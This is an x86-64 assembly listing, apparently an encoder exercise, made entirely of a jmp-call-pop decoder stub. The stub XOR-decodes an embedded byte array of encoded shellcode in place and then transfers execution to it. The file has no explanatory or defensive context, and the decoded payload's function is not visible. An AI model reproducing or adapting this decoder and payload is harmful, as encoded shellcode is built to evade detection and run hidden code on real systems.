section .text
  _start:
    xor   rax, rax
    xor   rcx, rcx

    mov   dl, 0x45
    jmp   short call_decoder

  decoder:
    pop   rsi

    lea   rdi, [rsi]

  decode:
    add rdi,rcx
    mov   bl, byte [rdi]
    sub rdi,rcx
    mov   bh, bl

    mov   al, dl
    xor   al, bl
    jz    short shellcode

    add rdi,rcx
    mov   ax, word [rdi + 1]
    sub rdi,rcx
    xor   ax, bx

    mov   word [rdi], ax

    inc   rcx

    lea   rdi, [rdi + 2]
    jmp   short decode

  call_decoder:
    call  decoder
    shellcode: db 0x7c, 0x34, 0xc4, 0x47, 0x68, 0x25, 0xd7, 0xbe, 0xb9, 0xc2, 0xed, 0xb1, 0x5b, 0x33, 0x5b, 0xe0, 0xb0, 0xb4, 0x7c, 0x23, 0x4d, 0x76, 0xb6, 0x26, 0xfc, 0x4c, 0xc7, 0x38, 0x6c, 0x62, 0xfd, 0xa9, 0xa3, 0xcf, 0xc0, 0xca, 0x21